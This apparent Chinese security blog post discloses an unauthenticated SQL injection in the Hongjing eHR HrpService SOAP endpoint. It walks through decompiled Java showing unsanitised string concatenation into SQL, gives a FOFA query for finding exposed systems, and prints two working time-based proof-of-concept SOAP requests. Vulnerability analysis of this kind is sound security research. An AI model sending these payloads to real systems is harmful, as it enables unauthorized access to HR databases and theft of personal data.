---
title: "宏景人力资源管理系统 HrpService SQL注入漏洞"
source: https://mrxn.net/jswz/hjsoft-HrpService-sqli.html
asset_dir: assets/宏景人力资源管理系统-hrpservice-sql注入漏洞
---

# 宏景人力资源管理系统 HrpService SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/6/19 08:18
* 1238浏览
* [0评论](#comment)
* 53分钟阅读

深入探索

hrms

鉴权

身份验证


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

宏景[人力资源管理系统](#)（eHR）是一款由宏景软件研发的系统。宏景人力资源管理系统的 `HrpService` 接口处存在[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，未经过身份认证的远程攻击者可利用此漏洞执行任意SQL指令，从而窃取数据库敏感信息。

商务软件和生产力软件

# 影响版本

# fofa语法

> `app="HJSOFT-HCM"`

# 漏洞分析

关于路由的分析以及两个路由请求触发方式，参考这篇文章：[宏景eHR HrChangeInfoService SQL注入漏洞+XXE漏洞](https://mrxn.net/jswz/hjsoft-HrChangeInfoService-sqli.html)

因此我们直接去 `WEB-INF/classes/META-INF/xfire/services.xml` 查找我们本次审计的主角 `HrpService` 部分的定义：

SQL注入检测工具

```
<service xmlns="http://xfire.codehaus.org/config/1.0">
    <name>HrpService</name>
    <namespace>http://www.hjsj.com/HrpService</namespace>
    <serviceClass>com.hjsj.hrms.service.HrpIssuanceService</serviceClass>
  </service>
  <service xmlns="http://xfire.codehaus.org/config/1.0">
    <name>HrpServices</name>
    <namespace>http://www.hjsj.com/HrpServices</namespace>
    <serviceClass>com.hjsj.hrms.service.HrpIssuanceService</serviceClass>
  </service>
```

可以看到两个service均由同一个类处理，因此测试时可以有两种url方式

## processResult

跟进 `HrpService` 类，看第一个方法 `processResult` 的实现

```
public String processResult(String var1, String var2) {
        String var3 = "1";
        SynOaService var4 = new SynOaService();
        var3 = var4.processResult(var1, var2);
        return var3;
    }
```

深入探索

漏洞扫描服务

Windows安全工具

授权

变量 var1、var2,被直接带入 `processResult` 方法

```
public String processResult(String var1, String var2) {
        String var3 = "1";
        Connection var4 = null;

        try {
            log.debug("SynOaService  task_id=" + var1 + ",result=" + var2);
            var4 = AdminDb.getConnection();
            if (var4 != null) {
                String var5 = this.getIdByTask(var1, var4, 1);
                String var6 = this.getIdByTask(var1, var4, 2);
                UserView var7 = this.getUserViewByTask(var1, var4);
                TemplateTableBo var8 = new TemplateTableBo(var4, Integer.parseInt(var5), var7);
```

跟进 `getIdByTask` 方法

```
private String getIdByTask(String var1, Connection var2, int var3) {
        String var4 = "";
        RowSet var5 = null;

        try {
            ContentDAO var6 = new ContentDAO(var2);
            String var7 = "select tabid from t_wf_instance where ins_id=(select ins_id from t_wf_task where task_id=" + var1 + " )";
            if (var3 == 2) {
                var7 = "select ins_id from t_wf_task where task_id=" + var1;
            }

            var5 = var6.search(var7);
            if (var5.next()) {
```

可以看到 var1 被直接拼接进sql语句中执行，无任何过滤和校验处理，造成[SQL注入漏](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

## getHrInfoByID

看下 `getHrInfoByID` 方法

```
public String getHrInfoByID(String var1, String var2, String var3, String var4, String var5, String var6, String var7) {
        String var8 = this.getUserNameByID(var1, var2);
        return this.getHrInfo(var8, "", "false", var4, var5, var6, var7);
    }
```

七个变量中的 var1 var2 被带入 `getUserNameByID` 方法中

```
private String getUserNameByID(String var1, String var2) {
        String var3 = "";
        String var4 = "";
        String var5 = "";
        RowSet var6 = null;
        Connection var7 = null;

        try {
            var7 = AdminDb.getConnection();
            if (null != var7) {
                ContentDAO var8 = new ContentDAO(var7);
                StringBuffer var9 = new StringBuffer();
                DbNameBo var10 = new DbNameBo(var7);
                ArrayList var11 = var10.getAllDbNameVoList();
                if (null != var11 && !var11.isEmpty()) {
                    for(int var12 = 0; var12 < var11.size(); ++var12) {
                        RecordVo var13 = (RecordVo)var11.get(var12);
                        var4 = var13.getString("pre");
                        var9.append("SELECT a0100 FROM ");
                        var9.append(var4 + "A01");
                        var9.append(" WHERE UPPER(");
                        var9.append(var1);
                        var9.append(")='");
                        var9.append(var2.toUpperCase());
                        var9.append("'");
                        var6 = var8.search(var9.toString());
                        if (var6.next()) {
```

var1被直接拼接进 `WHERE UPPER(var1)` 中，无任何过滤或校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，var2 同样如此。

代码安全审计

# 漏洞复现

## processResult

```
POST /services/HrpService HTTP/1.1
Host: hjsoft.mrxn.net
Content-Type: text/xml;charset=UTF-8
SOAPAction: ""

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrp="http://www.hjsj.com/HrpService">
   <soapenv:Header/>
   <soapenv:Body>
      <hrp:processResult>
         <hrp:in0>1)WAITFOR DELAY '0:0:5'-- </hrp:in0>
         <hrp:in1>1</hrp:in1>
      </hrp:processResult>
   </soapenv:Body>
</soapenv:Envelope>
```

[![宏景人力资源管理系统 HrpService SQL注入漏洞](images/img-001-a1a0bf48a5dc.webp)](https://image.mrxn.net/48152d032cc84cdfb260a1c39f5cafe9.webp)

成功延时 5 秒

漏洞修复方案

## getHrInfoByID

> 两种路由都是可以的噢！

```
POST /servlet/XFireServlet/HrpService HTTP/1.1
Host: hjsoft.mrxn.net
Content-Type: text/xml;charset=UTF-8
SOAPAction: ""

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrp="http://www.hjsj.com/HrpService">
   <soapenv:Header/>
   <soapenv:Body>
      <hrp:getHrInfoByID>
         <hrp:in0>1</hrp:in0>
         <hrp:in1>1'WAITFOR DELAY '0:0:5 </hrp:in1>
         <hrp:in2>1</hrp:in2>
         <hrp:in3>1</hrp:in3>
         <hrp:in4>1</hrp:in4>
         <hrp:in5>1</hrp:in5>
         <hrp:in6>1</hrp:in6>
      </hrp:getHrInfoByID>
   </soapenv:Body>
</soapenv:Envelope>
```

也是成功延时 5 秒

物流软件安全

[![宏景人力资源管理系统 HrpService SQL注入漏洞](images/img-002-421c8612385d.webp)](https://image.mrxn.net/0028ed04265f4db9a5eb65ca28a2aa58.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [4.1.processResult](#toc-4-1-)
* [4.2.getHrInfoByID](#toc-4-2-)
* [5.漏洞复现](#toc-5-)
* [5.1.processResult](#toc-5-1-)
* [5.2.getHrInfoByID](#toc-5-2-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[宏景人力资源管理系统 HrpService SQL注入漏洞](https://mrxn.net/jswz/hjsoft-HrpService-sqli.html)  
文章链接：<https://mrxn.net/jswz/hjsoft-HrpService-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

网络安全

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKdklEQVR4AeybjZLiOAyE+e793/mOTk/bmtgJYecH6tYUouVWS/ZYMQG29p/b7fbvV+3fj0fqfAw3mHFb4AderswVzRHOljXT7nUzzZ9wasg9bz3fZQdaQ+4dvz1jZ38AcAPbVR1YD89hrZ/1w3GNqp/5MOambkWwblaj6q74tUZrSCWX/7odGBoC7jzM8WypuRqqZsaBaydW8VFu4skB14KOic0w+cJZPJzie4Nxjr2mjqHrYfSrNv7QkAQWvmYHVkNes++Hs35rQ8DHss4G5qBjjccHxzMWwsiJP7Irbzc1F56rX3N/yv/WhvzUIv+muj/SkFypjxB8hQJtzx/lJA5sH60zFoK5VuzugDnF93YPb0+wBtjGRy81/0jzVf5HGnL76qr+4vzVkDdr/tCQeixn/rPrB7a3Fhix1spc0HWJQ+fAfvTRVARrgEYDwzrOaiQmhDEXzLUJJo5yz2ySchsaMhMt7vd2oDUE3HG4hs8usV4pya0ceN4zLnkVwXlA+y2uxlMvXMZCcK78GJiLvmI0wsrvfXANuIY1vzWkkst/3Q6shrxu76cz/6Pj91VL5dTJWBgO+vEVf2Qw6sBczQFzqS+s8Wd8cC3ob3vQuVktzSdLTP532Doh2dE3wdOGgK+S2VrBMWAWHrjZ1TOIdkRyQmdcETj8OCsdOJ4aM5QuBtZnXBEcA2ZlGgcMawJzTXR3wBx0PG3IPeednn/FWv4Bdyd/LXgMhPqEwNb9euVEAI5lXBEcAxoNbLWAxs3qJghc0kPX1XryU+sZBNdTfgzMpQ54DP0+FK1wpgtXcZ2Quhtv4K+GvEET6hLax17wkdPxilXh3gfroeNeozE4nppCMKf4FVPO3s7yqjY68JzQMbpohOGg68TLoHN7neIx6Dqwn9gMU0u4Tshsh17IXWoIuMtwfsOa/R3qugzGGjP9GQe9Btif6cEx6Kg17A0crzXA3F67H9cc+TWusaxy8cXvDTwnsH7tvb3Z49IJebM1/6+X076H5EhBPz75yxMThoOuE18Negzs13hqVC5+YhXBNSoXPTgG1PDgA9t3mCFwJ8Ax6G/J0Lm7ZHtC58D+1XXAZ73ytqL3F/mxdULuG/JOz0sNAXcXaGtPR4WNPHGA7QqFc6wlwNrKxQfHNP8V2+cBoT4hsK2zkmCuzpM4OJaxMDr5ZzbTXWrIWdEV+94dWA353v38crXThsyOFPiIQscrq0itirM8OK77KHdW74yr9fZ+zUsM+trCBat+5s900OuB/dOGzAov7md3oDUE3KF0Uggjl+UoHgPrwBi+YvKEMOrEy2Y54cB5cP3jqWrKUqMi9HpgX9q9gWOz3L1WY7BefgxGLrFatzUkwYWv3YHVkNfu/zB7a0iOTVXMuMTBRxD628csFu4qQq+bHDCX9QjhOQ6sh46pr3qxcM9i8oVXc6WVQV9Ta8jVIkt3aQf+WNT+gepqBXV0b8nd8xpD7z7Yjx48hvGURVMRRj10rmrjaw2yjB8huF7VKV92xoHzgCobfGD7JQAYYiLWCdEuvJGdNgRo3QT7WTt4DB1nsXAVdbXJKjfzpal2RSM9jGsSf2S1bjSVO/PBc1VNaoBj0N8BEhOC4zX3tCFVuPzf2YHVkN/Z58uztH+gSgb4GMH5MdORiyV3hjMNeI6qB3PRCxOHxzGwBkjaFIH2NhwBdA7sa/5YdDOMpiKMNcBcrZGcyq0TUnfjDfzhY2+6Jsz6wN2Ffmpg5KKvCNZV7swH64Em01pkjSiO+FihBxfYTsYQuBPJrwjWA3eFn8BWAzBxfwUaB/bv9OETrIGOVbxOSN2NN/BXQ96gCXUJpzf1CGdHuXLRBWssfmLCMy4xIfhYK0cGHsMclSOTNgbWipeFF4Jj8mMwcokpPwbWZRyNcMaJv2LrhFzZpV/UtIaAO17nhpFL98ExoKUAww0OzDXR3QFzqSUEc9BRvOyecvhUPDYTncWu6qGvCezv62YsBGug42yucMqJtYYkuPC1O7Aa8tr9H2YfvocMijsB49HLEROC4/L3dk/fnpXfiIOXM90sBp4bOh6U3uhaI/4W+HgB10nsCD/k07foxCqmziNunZC6Q2/gDx9708mKdZ3gKwg61rh86LHUgZGTNhZdxkJwjnwZeAxouFnyjnAT3V+A4Wq+04dP6PqIoHNgP7GKs7WA9TWWHHAMWP8/5PZmj6ffsmqH9/7sbwN3/ywG1gCfZKkPbFd3xhXBMTjHFJ7lJnaE4No1Xuvs/ao788F1a/7TDTmb4Fpsqc52YDXkbHdeEBs+9oKPEXScrQvGOJib6R9xObbgGtDxLDd5Fau+8vLh+bqpp/wY9DpAJIeYvCoIB2xvycC6qd/e7NHestKtR5j1Vx24w+GiEYarCJ/1ioE55RwZWAMdj7R7Hpyjufa212oM1gMaPjSgXeVg/2HSh6CupzXkI7bgxTuwGvLiBuynbw2B544ZWA/939n3xY/GOaJH8T0ffcW9RmPwmuRfMbAeOmaOmn+VqznP+NDnbw15psDS/twODA2B3i0Y/SwlV40wHFgvLgbmoqkIjkE/ZckTVq186HqN96YcWeXBOeJlNaaxrHJgfeXig2PQMTHViYV7hOA6yRMODXlU5F3j/5d1rYa8WSfbz+86LrK6Po1llQMfM+hY43tf+bLKg3MfccqTRSc/Fg5cCwg1RWD7nlCDMHKJZx7hjBNfLRphePkxOJ4LHAPWN/Xbmz2G37Lq+sCdq1z8XAXCcDME14CO0Sl3b9B1YD/6Gdb8xM84cE2Yf5BILnQd2E/9ijDGwBx0rDnxM1fGwnUP0S68ka2GvFEztJR2U9dAlmNUUfzeYDyOyanacDOsOnC9qqtx+WANoOFgwHDjTr1BXAhwHtDY5FVswbsDfJoLPAbu0fGZOsCWBx0TE64TMu7dS5nTm3pWps6dWXTQuw7H/kyf+tDzwkWfsTDcDKHXgM++cmPgWMZCMAfnmHmVc2TRCMH1qla8DBwD1sfe2+nj94PtHgK9S/Ccn2Wn+xlXTEwIrl/jMx+u6fa5miO2j10dJ1+YHPmxcEHwWoFQUwTaPSSC1BSue0h25U1wNeRNGpFltIbouDxjKTDDWR0Yj2rNBcdnudGBNdC/ZSf2CFMXeo1ZTnSz2BmXPOFMJ142i0FfU2vITLi439+BoSHQuwWj/x1L1JVyZNDnPJsLrDvTzGJ13lkcnqsL1sOItT44Xrn4dU1DQyJa+JodWA15zb4fzvqtDQEfSxixHsusBrou3AzBulojPjgGtFRg+KwP5prowEndg/Al+qxGYhVr0W9tSC28/OMdOIt8a0Nq1+OfTT6LJU+4j4Ovcui412is3L2J31s0e15jGOeAziV3hsrfW3R7XmPodb+1ISq+7Gs7sBrytf379uyhITlaR/inK4B+LMF+nSN1wTHomNhMn5gwcfkxcJ3EwGMgkk8IbB8IKpncyoF1cIzJE9bc+OBcxWNDQyJe+JodaA0Bdwuu4dlyoddI58/0NRa9MLx8GfS6+5ji4aDrxMvAXDRCMAcdpZUpfsWklc200OuC/Zmucq0hlVz+63ZgNeR1ez+d+T8AAAD//3WnI84AAAAGSURBVAMAZcy7sO5/x4QAAAAASUVORK5CYII=)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hjsoft-HrpService-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

编程

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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